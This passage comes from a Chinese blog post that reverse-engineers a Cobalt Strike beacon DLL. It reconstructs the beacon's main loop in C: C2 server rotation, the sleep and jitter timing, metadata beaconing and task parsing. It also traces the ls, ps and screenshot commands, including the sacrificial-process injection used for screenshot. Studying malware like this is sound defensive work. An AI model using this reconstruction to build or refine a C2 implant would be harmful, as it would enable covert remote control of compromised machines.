(unk_1B0A80)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放资源并返回</span></span><br><span class="line">    (unk_1B9DB0)(v5);</span><br><span class="line">    <span class="keyword">return</span> sub_1B91DC();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看资料，优化之后为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 初始化 Beacon</span></span><br><span class="line">    Beacon_init(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化数据解析器</span></span><br><span class="line">    datap* parser = BeaconDataInit(<span class="number">0x280</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数据解析器中读取 HTTP GET URL</span></span><br><span class="line">    <span class="type">char</span>* http_get_url = BeaconDataPtr(parser, <span class="number">256</span>);</span><br><span class="line">    BeaconDataPtr(parser, <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数据解析器中读取服务器主机缓冲区</span></span><br><span class="line">    <span class="type">char</span>* ServerHost_buffer = (<span class="type">char</span>*)BeaconDataPtr(parser, <span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数据解析中获取服务器IP和端口</span></span><br><span class="line">    <span class="type">char</span>* ServerIP = get_str(<span class="number">8</span>);</span><br><span class="line">    <span class="type">int</span> ServerPort = get_short(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数据解析中获取 Agent 和 POST URL</span></span><br><span class="line">    <span class="type">char</span>* lpszAgent = get_str(<span class="number">9</span>);</span><br><span class="line">    <span class="type">char</span>* ServerPostUrl = get_str(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数据解析中获取一些配置参数</span></span><br><span class="line">    g_dwMilliseconds = get_dword(<span class="number">3</span>);</span><br><span class="line">    g_jitter = get_short(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接错误标记</span></span><br><span class="line">    <span class="type">int</span> conne_error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化旋转策略结构体</span></span><br><span class="line">    rotationstruc* rotation_opt = (rotationstruc*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(rotationstruc));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数据解析中获取一些策略参数</span></span><br><span class="line">    <span class="type">int</span> failover_Strategy_number = get_dword(<span class="number">69</span>);</span><br><span class="line">    <span class="type">int</span> failover_Strategy_time = get_dword(<span class="number">70</span>);</span><br><span class="line">    <span class="type">int</span> rotate_Strategy_time = get_dword(<span class="number">68</span>);</span><br><span class="line">    <span class="type">int</span> strategyID = get_short(<span class="number">67</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化旋转策略</span></span><br><span class="line">    init_rotation(rotation_opt, strategyID, rotate_Strategy_time, failover_Strategy_time, failover_Strategy_number);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果有结束运行日期,退出</span></span><br><span class="line">    <span class="keyword">if</span> (beacon_stop_date())</span><br><span class="line">    &#123;</span><br><span class="line">        Beacon_exit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数据解析中获取服务器响应数据缓冲区大小</span></span><br><span class="line">    <span class="type">int</span> server_output_size = get_dword(<span class="number">4</span>); <span class="comment">//.http-get.server.output</span></span><br><span class="line">    <span class="type">char</span>* server_output_buffer = (<span class="type">char</span>*)<span class="built_in">malloc</span>(server_output_size);</span><br><span class="line">    Generate_encryption_metadata(server_output_buffer, server_output_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 主循环,直到 g_dwMilliseconds 为 0</span></span><br><span class="line">    <span class="keyword">while</span> (g_dwMilliseconds)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 根据旋转策略获取服务器主机和URL</span></span><br><span class="line">        <span class="type">char</span>* p_ServerHost = beacon_Rotation_Strategy(rotation_opt, ServerIP, conne_error);</span><br><span class="line">        _snprintf(ServerHost_buffer, <span class="number">0x80</span>, <span class="string">&quot;%s&quot;</span>, p_ServerHost);</span><br><span class="line">        conne_error = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span>* p_ServerUrl = beacon_Rotation_Strategy(rotation_opt, ServerIP, <span class="number">0</span>);</span><br><span class="line">        _snprintf(http_get_url, <span class="number">0x80</span>, <span class="string">&quot;%s&quot;</span>, p_ServerUrl);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置 HTTP 连接</span></span><br><span class="line">        g_BeaconStart = <span class="number">1</span>;</span><br><span class="line">        _snprintf(g_post_url, <span class="number">0x100</span>u, <span class="string">&quot;%s&quot;</span>, ServerPostUrl);</span><br><span class="line">        set_winit_http(ServerHost_buffer, ServerPort, lpszAgent);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送元数据并接收服务器响应</span></span><br><span class="line">        <span class="type">int</span> server_out_size = call_send_Metadata(http_get_url, server_output_buffer, server_output_size);</span><br><span class="line">        <span class="keyword">if</span> (server_out_size &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 解密服务器响应数据</span></span><br><span class="line">            <span class="type">int</span> taskdata_size = decrypt_output_data(server_output_buffer, server_out_size);</span><br><span class="line">            server_out_size = taskdata_size;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 解析任务数据</span></span><br><span class="line">            <span class="keyword">if</span> (taskdata_size &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                Parse_Task((BeaconTask*)server_output_buffer, taskdata_size);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理连接错误</span></span><br><span class="line">        <span class="keyword">if</span> (server_out_size == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            conne_error = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 执行其他任务,如下载检查、子 Beacon 检查、任务输出检查</span></span><br><span class="line">            sub_1000715A();</span><br><span class="line">            <span class="keyword">if</span> (get_dword(<span class="number">28</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                CheckDownload(<span class="number">4096</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                CheckDownload(<span class="number">0x80000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            CheckChildBeacon();</span><br><span class="line">            CheckJobOutput();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果有结束运行日期,退出</span></span><br><span class="line">            <span class="keyword">if</span> (beacon_stop_date())</span><br><span class="line">            &#123;</span><br><span class="line">                Beacon_end();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果有待发送的数据,发送它们</span></span><br><span class="line">            <span class="keyword">if</span> (g_withdatasize &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                close_http_Handle();</span><br><span class="line">                set_winit_http(ServerHost_buffer, ServerPort, lpszAgent);</span><br><span class="line">                sned_beacon_data(gBeaconOutputData);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭 HTTP 连接</span></span><br><span class="line">        close_http_Handle();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果有结束运行日期,退出</span></span><br><span class="line">        <span class="keyword">if</span> (beacon_stop_date())</span><br><span class="line">        &#123;</span><br><span class="line">            Beacon_exit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果 g_dwMilliseconds 为 0,退出</span></span><br><span class="line">        <span class="keyword">if</span> (!g_dwMilliseconds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据 Jitter 参数,确定下次执行的延迟时间</span></span><br><span class="line">        <span class="keyword">if</span> (g_jitter)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> temp = g_dwMilliseconds * g_jitter / <span class="number">0x64</span>;</span><br><span class="line">            temp = temp ? random_int() % temp : <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> dwMilliseconds = g_dwMilliseconds;</span><br><span class="line">            <span class="keyword">if</span> (temp &lt; g_dwMilliseconds)</span><br><span class="line">            &#123;</span><br><span class="line">                dwMilliseconds = g_dwMilliseconds - temp;</span><br><span class="line">            &#125;</span><br><span class="line">            BeaconSleep(dwMilliseconds);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            BeaconSleep(g_dwMilliseconds);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放资源并退出</span></span><br><span class="line">    <span class="built_in">free</span>(rotation_opt);</span><br><span class="line">    <span class="keyword">return</span> Beacon_exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过源码分析，直接进入while</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813162836-m988wco.png" alt="image" loading="lazy">​</p>
<p>循环EA60h，即等待上线时间</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813163039-ftirtif.png" alt="image" loading="lazy">​</p>
<p>当运行到	v16 &#x3D; v15;成功上线，即call    near ptr unk_1ADF80结束之后，对比源码得知</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set_winit_http(ServerHost_buffer, ServerPort, lpszAgent);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> server_out_size = call_send_Metadata(http_get_url, server_output_buffer, server_output_size);</span><br></pre></td></tr></table></figure>

<p>第一行代码设置了 HTTP 连接所需的参数,第二行代码执行了一个 HTTP GET 请求并获取服务器的响应数据</p>
<p>‍</p>
<h4 id="beacon接收指令"><a href="#beacon接收指令" class="headerlink" title="beacon接收指令"></a>beacon接收指令</h4><p>查看静态汇编</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813164956-yb265iu.png" alt="image" loading="lazy">​</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v13 = sub_18000DF80(Buffer, &amp;dword_180047720, v9, v12);</span><br></pre></td></tr></table></figure>

<p>这个是每次循环中的请求指令</p>
<p>当接收到符和的指令，就会进入if判断，如果命令符和，就会调用sub_180016654(v9, v14);函数，进行命令执行</p>
<p>跟进分析</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813165844-8w0pqfv.png" alt="image" loading="lazy">​</p>
<p>对接收到的命令进行解析，然后进入sub_180015F98选择执行</p>
<p>跟进sub_180015F98函数之后发现一堆的if判断，这里就是对不同命令进行解析后通过if判断，选择对应功能函数进行执行</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813170033-dymfwif.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<p>‍</p>
<h3 id="Dll入口点的非用户行为"><a href="#Dll入口点的非用户行为" class="headerlink" title="Dll入口点的非用户行为"></a>Dll入口点的非用户行为</h3><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-entry-point-function">动调链接库入口点函数</a></p>
<p>加载beacon.dll调用了其入口点函数DllEntryPoint()</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240812215212-5lmtmjb.png" alt="image" loading="lazy">​</p>
<p>DLL的入口函数有三个参数：</p>
<ol>
<li><p>​<code>hinstDLL</code>​：</p>
</li>
<li><ul>
<li>这是一个 <code>HINSTANCE</code>​ 类型的参数,代表当前 DLL 的实例句柄。</li>
<li>当 DLL 被加载时,此参数包含 DLL 的加载基地址。</li>
</ul>
</li>
<li><p>​<code>fdwReason</code>​：</p>
<ul>
<li><p>这是一个 <code>DWORD</code>​ 类型的参数,表示触发 DLL 入口点函数的原因。</p>
</li>
<li><p>它可以取以下值之一:</p>
<ul>
<li>​<code>DLL_PROCESS_ATTACH</code>​：当 DLL 被加载到进程地址空间时调用。</li>
<li>​<code>DLL_THREAD_ATTACH</code>​：当新线程被创建时调用。</li>
<li>​<code>DLL_PROCESS_DETACH</code>​：当 DLL 被从进程地址空间卸载时调用。</li>
<li>​<code>DLL_THREAD_DETACH</code>​：当线程终止时调用。</li>
</ul>
</li>
</ul>
</li>
<li><p>​<code>lpReserved</code>​：</p>
</li>
<li><ul>
<li>这是一个 <code>LPVOID</code>​ 类型的参数,当 <code>fdwReason</code>​ 为 <code>DLL_PROCESS_ATTACH</code>​ 或 <code>DLL_PROCESS_DETACH</code>​ 时,它包含额外的信息。</li>
<li>当 <code>fdwReason</code>​ 为 <code>DLL_THREAD_ATTACH</code>​ 或 <code>DLL_THREAD_DETACH</code>​ 时,此参数为 <code>NULL</code>​。</li>
</ul>
</li>
</ol>
<p>‍</p>
<p>继续刚才的动态调试</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240812221244-xpfokyc.png" alt="image" loading="lazy">​</p>
<p>这里调用DllEntryPoint函数前，入栈了一些参数</p>
<ul>
<li>RCX&#x3D;003650000h，即加载DLL的基址</li>
<li>EDX&#x3D;1，即本次调用的原因：DLL_PROCESS_ATTACH</li>
<li>R8&#x3D;0，即本次为动态加载</li>
</ul>
<p>​<code>BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)</code>​</p>
<p>‍</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240812221954-5b8uymb.png" alt="image" loading="lazy">​</p>
<p>这里步入loc_36732B4，其实就是静态分析的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( fdwReason == <span class="number">1</span> )</span><br><span class="line">   _security_init_cookie();</span><br></pre></td></tr></table></figure>

<p>调用<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/security-init-cookie?view=msvc-170"><code>\_security\_init\_cookie</code></a>​<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/security-init-cookie?view=msvc-170">函数</a></p>
<p>​<code>_security_init_cookie</code>​ 是 Microsoft Visual C++ 运行时库 (CRT) 提供的一个函数,用于初始化一个安全 cookie 值,以帮助检测栈溢出漏洞。</p>
<p>人话：安全检测函数</p>
<p>因为已经知道这个函数的具体作用就直接步过，下一步就是进行<code>_DllMainCRTStartup()函数</code>​的调用</p>
<p>​<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/cpp/build/run-time-library-behavior?view=msvc-170#default-dll-entry-point-_dllmaincrtstartup"><code>\_DllMainCRTStartup</code></a>​ 是 Microsoft Visual C++ 运行时库 (CRT) 提供的一个特殊的 DLL 入口点函数,用于处理 DLL 的生命周期事件。它是 Windows 动态链接库 (DLL) 的标准入口点函数之一。</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240812223747-vsemf3z.png" alt="image" loading="lazy">​</p>
<p>_DllMainCRTStartup()函数没有调用_security_init_cookie()进行安全存根校验，这是 因为VCRuntime允许在进程附加时立刻调用_security_init_cookie()进行安全存根校验，即 DllEntryPoint()中的行为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall _DllMainCRTStartup(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span><br><span class="line">&#123;</span><br><span class="line">    BOOL v7; <span class="comment">// DllMain 函数的返回值</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// 函数的返回值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 fdwReason 为 0 且 dword_1800434D8 未设置,返回 0</span></span><br><span class="line">    <span class="keyword">if</span> (!fdwReason &amp;&amp; !dword_1800434D8)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 fdwReason 为 1 (进程附加) 或 2 (线程附加),调用 CRT_INIT</span></span><br><span class="line">    <span class="comment">// 如果 CRT_INIT 返回 false,返回 0</span></span><br><span class="line">    <span class="keyword">if</span> (fdwReason - <span class="number">1</span> &lt;= <span class="number">1</span> &amp;&amp; !CRT_INIT(hinstDLL, fdwReason, lpvReserved))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用用户提供的 DllMain 函数</span></span><br><span class="line">    v7 = DllMain(hinstDLL, fdwReason, lpvReserved);</span><br><span class="line">    v8 = v7;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 fdwReason 为 1 (进程附加) 且 DllMain 返回 false,</span></span><br><span class="line">    <span class="comment">// 再次调用 DllMain,fdwReason 为 0 (进程分离),</span></span><br><span class="line">    <span class="comment">// 并调用 CRT_INIT,fdwReason 为 0</span></span><br><span class="line">    <span class="keyword">if</span> (fdwReason == <span class="number">1</span> &amp;&amp; !v7)</span><br><span class="line">    &#123;</span><br><span class="line">        DllMain(hinstDLL, <span class="number">0</span>, lpvReserved);</span><br><span class="line">        CRT_INIT(hinstDLL, <span class="number">0</span>i64, lpvReserved);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 fdwReason 为 0 (进程分离) 或 3 (线程分离),</span></span><br><span class="line">    <span class="comment">// 调用 CRT_INIT 并使用结果设置返回值</span></span><br><span class="line">    <span class="keyword">if</span> (!fdwReason || fdwReason == <span class="number">3</span>)</span><br><span class="line">        v8 &amp;= -(CRT_INIT(hinstDLL, fdwReason, lpvReserved) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回结果</span></span><br><span class="line">    <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>‍</p>
<h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240903212309-s4dxvqc.png" alt="image" loading="lazy">​</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(sub_19DFD4)(v2, v3, v23);</span><br></pre></td></tr></table></figure>

<p>进入分析sub_19DFD4</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240903213113-xs9o1ze.png" alt="image" loading="lazy">​</p>
<p>​<code>api-ms-win-http-time-l1-1-0</code>​ 是 Windows 操作系统中的一个 API 集合，属于 Microsoft 的 API 微软 API 版本管理体系。它通常用于处理 HTTP 请求和时间相关的功能。</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240903213152-5rcre8b.png" alt="image" loading="lazy">​</p>
<p>off_1BC548处是一个wininet_InternetSetOptionA函数所以sub_19DFD4函数是发送请求</p>
<p>​<code>wininet_InternetSetOptionA</code>​ 是 Windows API 中的一个函数，属于 <code>wininet</code>​ 库，用于设置 Internet 连接的选项。这个函数允许开发者配置许多 Internet 相关的行为和设置，影响 HTTP、FTP 等协议的网络请求。</p>
<p><strong>函数概述</strong></p>
<ul>
<li><p><strong>功能</strong>: <code>InternetSetOptionA</code>​ 函数用于设置 Internet 连接的特定选项，如超时、代理设置、缓存行为等。</p>
</li>
<li><p><strong>语法</strong>:<br>c</p>
<p>复制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOL InternetSetOptionA(</span><br><span class="line">  HINTERNET hInternet,</span><br><span class="line">  DWORD dwOption,</span><br><span class="line">  LPVOID lpBuffer,</span><br><span class="line">  DWORD dwBufferLength</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>参数</strong></p>
<ol>
<li><p>​<strong>​<code>HINTERNET hInternet</code>​</strong>​:</p>
<ul>
<li>一个句柄，指向一个 Internet 连接。如果为 <code>NULL</code>​，则表示全局设置。</li>
</ul>
</li>
<li><p>​<strong>​<code>DWORD dwOption</code>​</strong>​:</p>
<ul>
<li><p>指定要设置的选项。可以是以下常量之一：</p>
<ul>
<li>​<code>INTERNET_OPTION_PROXY</code>​：设置代理服务器。</li>
<li>​<code>INTERNET_OPTION_TIMEOUT</code>​：设置连接超时。</li>
<li>​<code>INTERNET_OPTION_USER_AGENT</code>​：设置用户代理字符串等。</li>
</ul>
</li>
</ul>
</li>
<li><p>​<strong>​<code>LPVOID lpBuffer</code>​</strong>​:</p>
<ul>
<li>指向包含选项值的缓冲区。其类型和内容取决于 <code>dwOption</code>​ 的值。</li>
</ul>
</li>
<li><p>​<strong>​<code>DWORD dwBufferLength</code>​</strong>​:</p>
<ul>
<li>​<code>lpBuffer</code>​ 指向的缓冲区的大小（以字节为单位）。</li>
</ul>
</li>
</ol>
<p><strong>返回值</strong></p>
<ul>
<li>如果函数成功，返回值为非零值。如果失败，返回值为零，可以通过调用 <code>GetLastError</code>​ 来获取错误代码。</li>
</ul>
<p>‍</p>
<p>跳出这个函数继续调试进入19DF80偏移处的函数</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240904105142-4q8a8p1.png" alt="image" loading="lazy">​</p>
<p>这一步成功上线</p>
<h4 id="ls（列出当前目录中的文件和子目录"><a href="#ls（列出当前目录中的文件和子目录" class="headerlink" title="ls（列出当前目录中的文件和子目录"></a>ls（列出当前目录中的文件和子目录</h4><p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240905172853-hwup8ds.png" alt="image" loading="lazy">​</p>
<p>上线之后在客户端完成交互，输入ls，之后会预先循环一次</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240905181025-embj791.png" alt="image" loading="lazy">​</p>
<p>unk_1C0A80这里实现了心跳60s，可以在客服端修改时间，为了方便调试，sleep 5修改心跳时间</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240905181607-2zq54zq.png" alt="image" loading="lazy">​</p>
<p>进入sub_1C6654函数，继续执行到功能选择的那个函数内部</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240905182037-w7ec6m0.png" alt="image" loading="lazy">​</p>
<p>sub_1C0594函数就说实现了ls功能的函数，步进查看详细逻辑</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240905185355-1yymp1u.png" alt="image" loading="lazy">​</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240905185406-wdxklf1.png" alt="image" loading="lazy">​</p>
<p>做了一个do while()循环将当前目录下的所有文件的size、 type、  Last Modified、 Name；结束之后退出，到达sub_1BE188函数，发送了Internet请求，然后客户端接收到数据</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240905190008-o851ffa.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240905190145-0qc46p9.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<p>ps操作也是和ls操作结构类似使用kernel32_GetCurrentProcess等win api函数，获取process然后储存到特定内存等到发送完Internet请求之后在客户端回显靶机的process</p>
<p>‍</p>
<h4 id="screenshot​"><a href="#screenshot​" class="headerlink" title="screenshot​"></a><code>screenshot</code>​</h4><p>上线之后发送<code>screenshot</code>​操作，和上面ls调试类似进入功能选择函数，进行判断，它会先通过sub_150CE8函数，这个函数实现了一个启动傀儡进程并注入dll的完整操作</p>
<p>为了方便使用之前dump的静态文件进行分析</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240906215025-64nj7kk.png" alt="image" loading="lazy">​</p>
<p>进入sub_1800189B0继续分析</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240906215541-6f46p8t.png" alt="image" loading="lazy">​</p>
<p>通过动调分析180018AF0似乎进行了sysnative的调用，进入sub_180015298</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240906215719-ijp5cer.png" alt="image" loading="lazy">​</p>
<p>通过静态分析，15A0A0是memset函数，</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240907135717-za7hke9.png" alt="image" loading="lazy">​</p>
<p>这个函数创建了一个进程，并挂起，启动傀儡进程的关键步骤</p>
